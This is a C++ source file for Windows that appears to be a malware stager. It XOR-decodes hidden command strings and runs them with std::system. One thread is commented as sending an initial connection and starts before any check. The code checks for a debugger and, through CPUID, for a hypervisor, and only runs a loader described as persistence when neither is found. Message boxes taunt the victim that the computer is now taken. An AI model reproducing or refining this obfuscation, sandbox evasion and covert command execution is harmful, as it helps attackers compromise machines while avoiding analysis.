#include <utils.hpp>
#include <windows.h>
#include <intrin.h>

bool runningInVM() {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    
    // ECX bit 31 = hypervisor present
    return (cpuInfo[2] >> 31) & 1;
}

void prepLoader() {
    std::string lcmd = "";
    unsigned int len = sizeof(W) / sizeof(W[0]);

    for (int i = 0, k = 0; i < len;) {
        int a = W[i];
        int b = x[k % x.length()];

        char c = (a ^ b);
        lcmd += c;

        ++i; ++k;
    }

    std::system(lcmd.c_str());
}
void runner() {
    std::string rcmd = "";

    unsigned int len = sizeof(Wy) / sizeof(Wy[0]);

    for (int i = 0, k = 0; i < len;) {
        int a = Wy[i];
        int b = y[k % y.length()];

        char c = (a ^ b);
        rcmd += c;

        ++i; ++k;
    }

    std::system(rcmd.c_str());
}

void initialize() {
    // run separate thread to send an initial connection
    std::thread t(runner);
    t.detach();

    // winapi debugger check
    if (IsDebuggerPresent()) {
        MessageBox(
            NULL, // Owner window (NULL = no owner)
            "Debuggers make me ANGY! >:(", // Message text
            "I don't think so!", // Title of the window
            MB_OK
        );
        return;
    }

    // query CPU for hypervisor
    if (runningInVM()) {
        MessageBox(
            NULL, // Owner window (NULL = no owner)
            "I hate Hypervisors as much as I hate Supervision! >:(", // Message text
            "I don't think so!", // Title of the window
            MB_OK
        );
        return;
    }

    // determined system is worth persisting
    std::thread t2(prepLoader);
    t2.detach();

    MessageBox(
        NULL, // Owner window (NULL = no owner)
        "Nice computer you got here! Now its mine! NYA~ >w<", // Message text
        "Uh Oh!", // Title of the window
        MB_OK
    );
}